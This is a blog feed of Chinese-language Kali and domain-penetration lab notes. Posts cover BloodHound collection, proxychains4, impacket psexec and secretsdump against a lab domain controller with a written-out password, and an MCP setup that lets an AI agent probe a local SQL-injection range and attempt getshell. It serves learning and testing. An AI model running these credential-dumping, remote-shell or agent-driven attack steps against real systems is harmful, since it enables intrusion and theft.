<li>安装成功，还需要重启生效，重启一下。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009224635989.png" alt="image-20251009224635989"></li>
<li>再次执行<code>SharpHound.exe -c all</code>。成功！<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009224855646.png" alt="image-20251009224855646"></li>
<li>等待一会，出现两个文件。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009225024847.png" alt="image-20251009225024847"></li>
<li>拷贝20251009224853_BloodHound.zip文件到kali下。</li>
<li>启动bloodhound，右侧栏点击图标导入。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009225525575.png" alt="image-20251009225525575"></li>
<li>我这里导入出现错误，换了旧版本的收集器也不行，对了下二进制程序版本和收集器版本，都是4.3.1没毛病，但是解析报错<code>BAD JSON FILE</code>。这可咋整。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009225622347.png" alt="image-20251009225622347"></li>
<li>后来发现是导入按钮选错了，应该是如图所示位置的导入功能。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009231934017.png" alt="image-20251009231934017"></li>
<li>成功导入！<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009232006787.png" alt="image-20251009232006787"></li>
<li>左侧选择默认查询器进行查询，这里用的是查询域管理员查询器。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009232129572.png" alt="image-20251009232129572"></li>
</ol>
<h2 id="详细使用教程"><a href="#详细使用教程" class="headerlink" title="详细使用教程"></a>详细使用教程</h2><ol>
<li><a href="https://blog.csdn.net/qq_56426046/article/details/126854991">https://blog.csdn.net/qq_56426046/article/details/126854991</a></li>
<li><a href="https://www.freebuf.com/articles/web/288370.html">https://www.freebuf.com/articles/web/288370.html</a></li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>kali配置清华源</title>
    <url>/2025/10/09/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>kali版本。kali-linux-2025.3-vmware-amd64</li>
</ol>
<h2 id="配置清华源"><a href="#配置清华源" class="headerlink" title="配置清华源"></a>配置清华源</h2><ol>
<li>执行<code>sudo vim /etc/apt/sources.list</code>打开配置文件。按<code>i</code>执行编辑插入。</li>
<li>复制源粘贴进去（按ctrl+shift+v粘贴）。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
<img src="/../images/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/image-20251009191719775.png" alt="image-20251009191719775"></li>
<li>按<code>shift+:</code>，进入命令行。输入<code>wq!</code>保存。<br><img src="/../images/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/image-20251009192120070.png" alt="image-20251009192120070"></li>
<li>执行<code>sudo apt upgate</code>检查更新。<img src="/../images/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/image-20251009192324250.png" alt="image-20251009192324250"></li>
</ol>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装translate-shell及使用</title>
    <url>/2025/10/10/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h2><p>translate-shell是一个命令行翻译工具。</p>
<h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p>执行<code>sudo apt update &amp;&amp; sudo apt install translate-shell</code>安装。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010140547591.png" alt="image-20251010140547591"></p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><ol>
<li>简单翻译，可能响应有点慢。执行<code>echo &quot;hello&quot; | trans -e bing -t zh</code>。参数解释：<code>-e</code>指定翻译用的引擎，<code>-t</code>指定翻译的目标语言。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010140842208.png" alt="image-20251010140842208"></li>
<li>查看支持的翻译引擎。执行<code>trans -list-engines</code>，默认是auto自动。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010141100058.png" alt="image-20251010141100058"></li>
</ol>
<h2 id="更优雅的使用方式"><a href="#更优雅的使用方式" class="headerlink" title="更优雅的使用方式"></a>更优雅的使用方式</h2><p>在 <code>.bashrc</code> 或 <code>.zshrc</code> 中添加，kali用<code>.zshrc</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias trans=&#x27;trans -e bing&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010141524336.png" alt="image-20251010141524336"><br>之后就执行<code>source ~/.zshrc</code>加载环境变量，最后就可以直接使用<code>echo &quot;Hello&quot; | trans -t zh</code>调用bing翻译了。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010142149983.png" alt="image-20251010142149983"></p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的proxychains4代理工具使用</title>
    <url>/2025/10/10/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p><code>proxychains4</code> 是一款在 <strong>Linux&#x2F;macOS</strong> 系统中广泛使用的 <strong>命令行代理工具</strong>，核心功能是让原本不支持代理设置的命令行程序（如 <code>curl</code>、<code>ssh</code>、<code>nmap</code> 等）通过指定的代理服务器（如 SOCKS5、HTTP&#x2F;S）发起网络请求，实现流量转发。它基于动态链接库（<code>LD_PRELOAD</code> 机制）拦截程序的网络系统调用，无需修改程序本身代码，即可强制其走代理。</p>
<h2 id="工具配置"><a href="#工具配置" class="headerlink" title="工具配置"></a>工具配置</h2><p><code>proxychains4</code> 的配置文件默认路径为 <code>/etc/proxychains4.conf</code>（Linux）或 <code>/usr/local/etc/proxychains.conf</code>（macOS）。配置的核心是指定 <strong>代理服务器地址</strong> 和 <strong>代理规则</strong>。</p>
<h3 id="1-关键配置项解析"><a href="#1-关键配置项解析" class="headerlink" title="1. 关键配置项解析"></a>1. 关键配置项解析</h3><p>打开配置文件（需 root 权限，如 <code>sudo vim /etc/proxychains4.conf</code>），主要关注以下部分：</p>
<table>
<thead>
<tr>
<th>配置项</th>
<th>作用说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>dynamic_chain</code></td>
<td>启用 “动态代理链”：若前一个代理不可用，自动尝试下一个（推荐开启）；若注释则为 <code>strict_chain</code>（严格模式，一个不可用则失败）。</td>
</tr>
<tr>
<td><code>proxy_dns</code></td>
<td>启用 “代理 DNS 解析”：避免 DNS 请求泄露真实 IP（推荐开启，需取消注释）。</td>
</tr>
<tr>
<td><code>[ProxyList]</code></td>
<td>代理服务器列表，在此处添加你的代理地址，格式为：<code>协议类型 代理IP 代理端口 [用户名 密码]</code>（若代理需认证）。</td>
</tr>
</tbody></table>
<h3 id="2-常见配置示例"><a href="#2-常见配置示例" class="headerlink" title="2. 常见配置示例"></a>2. 常见配置示例</h3><p>假设你本地运行了一个 SOCKS5 代理（如 Clash（7890端口） 或 Shadowsocks（1080端口）），配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启用动态链和代理DNS</span><br><span class="line">dynamic_chain</span><br><span class="line">proxy_dns</span><br><span class="line"></span><br><span class="line"># 代理服务器列表（SOCKS5 示例）</span><br><span class="line">[ProxyList]</span><br><span class="line">socks5 192.168.1.23 1080  # 本地 SOCKS5 代理，无认证</span><br><span class="line"># http    192.168.1.100  8080  user1  pass1  # 带认证的 HTTP 代理示例</span><br></pre></td></tr></table></figure>

<h3 id="配置实例"><a href="#配置实例" class="headerlink" title="配置实例"></a>配置实例</h3><p>kali主机网卡改为桥接，DHCP分配到IP：192.168.1.19。宿主机IP：192.168.1.23，ssr开启局域网连接1080端口。<img src="/../images/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010161254096.png" alt="image-20251010161254096"></p>
<p>编辑配置文件<code>sudo vim /etc/proxychains4.conf</code>，在最后一行添加代理。</p>
<p><img src="/../images/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010161355130.png" alt="image-20251010161355130"></p>
<p>测试连接<code>proxychains4 curl www.google.com</code>。<img src="/../images/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010161507603.png" alt="image-20251010161507603"></p>
<p>静默输出，编辑配置文件。</p>
<p><img src="/../images/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010163939312.png" alt="image-20251010163939312"></p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的impacket工具使用</title>
    <url>/2025/10/10/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>kali主机。（IP：10.10.10.100）kali-linux-2025.3-vmware-amd64</li>
<li>域控主机。（IP：10.10.10.1）</li>
</ol>
<h2 id="工具路径"><a href="#工具路径" class="headerlink" title="工具路径"></a>工具路径</h2><p>在<code>/usr/bin</code>目录下，以<code>impacket-</code>开头</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010143357277.png" alt="image-20251010143357277"></p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="命令执行-impacket-psexec"><a href="#命令执行-impacket-psexec" class="headerlink" title="命令执行-impacket-psexec"></a>命令执行-impacket-psexec</h3><p>直接执行查看帮助。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-codec CODEC] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]</span><br><span class="line">                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]</span><br><span class="line">                 target [command ...]</span><br><span class="line"></span><br><span class="line">PSEXEC like functionality example using RemComSvc.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain/]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line">  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -c pathname           copy the filename for later execution, arguments are passed in the command option</span><br><span class="line">  -path PATH            path of the command to execute</span><br><span class="line">  -file FILE            alternative RemCom binary (be sure it doesn&#x27;t require CRT)</span><br><span class="line">  -ts                   adds timestamp to every logging output</span><br><span class="line">  -debug                Turn DEBUG output ON</span><br><span class="line">  -codec CODEC          Sets encoding used (codec) from the target&#x27;s output (default &quot;utf-8&quot;). If errors are detected, run chcp.com at the target, map the result with</span><br><span class="line">                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br><span class="line">  -no-pass              don&#x27;t ask for password (useful for -k)</span><br><span class="line">  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones</span><br><span class="line">                        specified in the command line</span><br><span class="line">  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)</span><br><span class="line">  -keytab KEYTAB        Read keys for SPN from keytab file</span><br><span class="line"></span><br><span class="line">connection:</span><br><span class="line">  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter</span><br><span class="line">  -target-ip ip address</span><br><span class="line">                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it</span><br><span class="line">  -port [destination port]</span><br><span class="line">                        Destination port to connect to SMB Server</span><br><span class="line">  -service-name service_name</span><br><span class="line">                        The name of the service used to trigger the payload</span><br><span class="line">  -remote-binary-name remote_binary_name</span><br><span class="line">                        This will be the name of the executable uploaded on the target</span><br></pre></td></tr></table></figure>
<p>简单连接域控，返回shell，执行<code>impacket-psexec test.com/administrator:win2k8dc.@10.10.10.1</code>。进入shell之后执行命令可能乱码，如图。</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010144540986.png" alt="image-20251010144540986"></p>
<p>因为域控是中文的版本，所以出现乱码，在目标域控shell上执行<code>chcp.com</code>查看编码code，红框处的936是编码代码。</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010145124629.png" alt="image-20251010145124629"></p>
<p>重新执行<code>impacket-psexec test.com/administrator:win2k8dc.@10.10.10.1 -codec 936</code>，指定codec参数为936，可以看到shell就不乱码了。</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010145240738.png" alt="image-20251010145240738"></p>
<h3 id="凭证窃取-impacket-secretsdump"><a href="#凭证窃取-impacket-secretsdump" class="headerlink" title="凭证窃取-impacket-secretsdump"></a>凭证窃取-impacket-secretsdump</h3><p>工具帮助文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-skip-sam] [-skip-security]</span><br><span class="line">                      [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist] [-exec-method [&#123;smbexec,wmiexec,mmcexec&#125;]] [-use-remoteSSMethod]</span><br><span class="line">                      [-remoteSS-remote-volume REMOTESS_REMOTE_VOLUME] [-remoteSS-local-path REMOTESS_LOCAL_PATH] [-just-dc-user USERNAME] [-ldapfilter LDAPFILTER] [-just-dc]</span><br><span class="line">                      [-just-dc-ntlm] [-skip-user SKIP_USER] [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB]</span><br><span class="line">                      [-dc-ip ip address] [-target-ip ip address]</span><br><span class="line">                      target</span><br><span class="line"></span><br><span class="line">Performs various techniques to dump secrets from the remote machine without executing any agent there.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL (if you want to parse local files)</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -ts                   Adds timestamp to every logging output</span><br><span class="line">  -debug                Turn DEBUG output ON</span><br><span class="line">  -system SYSTEM        SYSTEM hive to parse</span><br><span class="line">  -bootkey BOOTKEY      bootkey for SYSTEM hive</span><br><span class="line">  -security SECURITY    SECURITY hive to parse</span><br><span class="line">  -sam SAM              SAM hive to parse</span><br><span class="line">  -ntds NTDS            NTDS.DIT file to parse</span><br><span class="line">  -resumefile RESUMEFILE</span><br><span class="line">                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session&#x27;s state</span><br><span class="line">  -skip-sam             Do NOT parse the SAM hive on remote system</span><br><span class="line">  -skip-security        Do NOT parse the SECURITY hive on remote system</span><br><span class="line">  -outputfile OUTPUTFILE</span><br><span class="line">                        base output filename. Extensions will be added for sam, secrets, cached and ntds</span><br><span class="line">  -use-vss              Use the NTDSUTIL VSS method instead of default DRSUAPI</span><br><span class="line">  -rodcNo RODCNO        Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)</span><br><span class="line">  -rodcKey RODCKEY      AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)</span><br><span class="line">  -use-keylist          Use the Kerb-Key-List method instead of default DRSUAPI</span><br><span class="line">  -exec-method [&#123;smbexec,wmiexec,mmcexec&#125;]</span><br><span class="line">                        Remote exec method to use at target (only when using -use-vss). Default: smbexec</span><br><span class="line">  -use-remoteSSMethod   Remotely create Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY from it, the parse locally</span><br><span class="line">  -remoteSS-remote-volume REMOTESS_REMOTE_VOLUME</span><br><span class="line">                        Remote Volume to perform the Shadow Snapshot and download SAM, SYSTEM and SECURITY</span><br><span class="line">  -remoteSS-local-path REMOTESS_LOCAL_PATH</span><br><span class="line">                        Path where download SAM, SYSTEM and SECURITY from Shadow Snapshot. It defaults to current path</span><br><span class="line"></span><br><span class="line">display options:</span><br><span class="line">  -just-dc-user USERNAME</span><br><span class="line">                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch</span><br><span class="line">  -ldapfilter LDAPFILTER</span><br><span class="line">                        Extract only NTDS.DIT data for specific users based on an LDAP filter. Only available for DRSUAPI approach. Implies also -just-dc switch</span><br><span class="line">  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)</span><br><span class="line">  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)</span><br><span class="line">  -skip-user SKIP_USER  Do NOT extract NTDS.DIT data for the user specified. Can provide comma-separated list of users to skip, or text file with one user per line</span><br><span class="line">  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn&#x27;t apply to -outputfile data</span><br><span class="line">  -user-status          Display whether or not the user is disabled</span><br><span class="line">  -history              Dump password history, and LSA secrets OldVal</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br><span class="line">  -no-pass              don&#x27;t ask for password (useful for -k)</span><br><span class="line">  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones</span><br><span class="line">                        specified in the command line</span><br><span class="line">  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)</span><br><span class="line">  -keytab KEYTAB        Read keys for SPN from keytab file</span><br><span class="line"></span><br><span class="line">connection:</span><br><span class="line">  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter</span><br><span class="line">  -target-ip ip address</span><br><span class="line">                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it</span><br></pre></td></tr></table></figure>

<p>dump密码hash，执行<code>impacket-secretsdump test.com/administrator:win2k8dc.@10.10.10.1</code>。<img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010150045492.png" alt="image-20251010150045492"></p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的python的pip安装不了库的解决方案</title>
    <url>/2025/10/10/kali%E7%9A%84python%E7%9A%84pip%E5%AE%89%E8%A3%85%E4%B8%8D%E4%BA%86%E5%BA%93%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h2 id="报错信息分析"><a href="#报错信息分析" class="headerlink" title="报错信息分析"></a>报错信息分析</h2><p>执行安装库的命令<code>python3 -m pip install requests</code>。出现报错如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error: externally-managed-environment</span><br><span class="line"></span><br><span class="line">× This environment is externally managed</span><br><span class="line">╰─&gt; To install Python packages system-wide, try apt install</span><br><span class="line">    python3-xyz, where xyz is the package you are trying to</span><br><span class="line">    install.</span><br><span class="line">    </span><br><span class="line">    If you wish to install a non-Kali-packaged Python package,</span><br><span class="line">    create a virtual environment using python3 -m venv path/to/venv.</span><br><span class="line">    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make</span><br><span class="line">    sure you have pypy3-venv installed.</span><br><span class="line">    </span><br><span class="line">    If you wish to install a non-Kali-packaged Python application,</span><br><span class="line">    it may be easiest to use pipx install xyz, which will manage a</span><br><span class="line">    virtual environment for you. Make sure you have pipx installed.</span><br><span class="line">    </span><br><span class="line">    For more information, refer to the following:</span><br><span class="line">    * https://www.kali.org/docs/general-use/python3-external-packages/</span><br><span class="line">    * /usr/share/doc/python3.13/README.venv</span><br><span class="line"></span><br><span class="line">note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.</span><br><span class="line">hint: See PEP 668 for the detailed specification.</span><br></pre></td></tr></table></figure>
<p>这是因为 Kali Linux 采用了 Python 的 PEP 668 标准，将系统 Python 环境标记为“外部管理”。这意味着，直接在系统环境中安装 Python 包可能会破坏系统依赖，因此被默认禁止。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用虚拟环境</p>
<ol>
<li>创建虚拟环境。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m venv ~/dirmapDev</span><br></pre></td></tr></table></figure></li>
<li>激活虚拟环境。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source ~/dirmapDev/bin/activate</span><br></pre></td></tr></table></figure></li>
<li>退出虚拟环境<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure></li>
<li>删除虚拟环境。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m venv --clear ~/dirmapDev</span><br></pre></td></tr></table></figure></li>
<li>安装库。<img src="/../images/kali%E7%9A%84python%E7%9A%84pip%E5%AE%89%E8%A3%85%E4%B8%8D%E4%BA%86%E5%BA%93%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20251010164951838.png" alt="image-20251010164951838"></li>
</ol>
]]></content>
      <tags>
        <tag>kali</tag>
        <tag>pip</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>使用MCP自动化调用kali进行渗透测试</title>
    <url>/2025/10/11/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>逛b站发现有用mcp调用kali做渗透测试的教程，动手搭建一个玩玩。</p>
<p>github仓库地址（<a href="https://github.com/Wh0am123/MCP-Kali-Server%EF%BC%89">https://github.com/Wh0am123/MCP-Kali-Server）</a></p>
<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ol>
<li>git version 2.51.0.windows.2</li>
<li>Python 3.11.1</li>
<li>cherry studio</li>
<li>kali（IP：192.168.1.19）</li>
<li>win11（IP：192.168.1.61）</li>
</ol>
<h2 id="部署mcp服务器"><a href="#部署mcp服务器" class="headerlink" title="部署mcp服务器"></a>部署mcp服务器</h2><ol>
<li><p>kali上安装mcp，执行<code>sudo apt update &amp;&amp; sudo apt install mcp-kali-server</code><img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011045009942.png" alt="image-20251011045009942"></p>
</li>
<li><p>win11中的cherry添加mcp服务器配置文件。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;mcpServers&quot;: &#123;</span><br><span class="line">    &quot;kali-mcp&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;kali-mcp&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;stdio&quot;,</span><br><span class="line">      &quot;isActive&quot;: true,</span><br><span class="line">      &quot;command&quot;: &quot;C:\\Users\\h4ckf\\AppData\\Local\\Programs\\Python\\Python311\\python.exe&quot;,</span><br><span class="line">      &quot;args&quot;: [</span><br><span class="line">        &quot;C:\\Users\\h4ckf\\Documents\\[01]渗透测试工具\\mcp\\MCP-Kali-Server\\mcp_server.py&quot;,</span><br><span class="line">        &quot;--server&quot;,</span><br><span class="line">        &quot;http://192.168.40.139:5000/&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>在kali中，clone仓库，创建虚拟环境，安装flask，执行kali_server.py。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Wh0am123/MCP-Kali-Server.git</span><br><span class="line">cd MCP-Kali-Server</span><br><span class="line">python3 -m venv ~/mcpkali</span><br><span class="line">source ~/mcpkali/bin/activate</span><br><span class="line">python3 -m pip install flask</span><br><span class="line">python3 kali_server.py</span><br></pre></td></tr></table></figure></li>
<li>输出如下图，就是成功启动mcp服务器了。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011053013953.png" alt="image-20251011053013953"></li>
</ol>
<h2 id="使用ai挖掘sql注入漏洞"><a href="#使用ai挖掘sql注入漏洞" class="headerlink" title="使用ai挖掘sql注入漏洞"></a>使用ai挖掘sql注入漏洞</h2><ol>
<li>回到win11，开始对话，询问deepseek是否连接上kali mcp服务器，可以看到调用server_health工具检查连接状态，连接成功。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011053301120.png" alt="image-20251011053301120"></li>
<li>接下来实战，让ai进行渗透测试。这里我本地搭建了个sql-lab靶场。给出url让ai判断是否纯在sql注入漏洞。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011053459790.png" alt="image-20251011053459790"></li>
<li>ai判断存在sql注入，让他获取数据看看。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011053601067.png" alt="image-20251011053601067"></li>
<li>更进一步！让ai尝试getshell，可以看到报了些错误。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011053641219.png" alt="image-20251011053641219"></li>
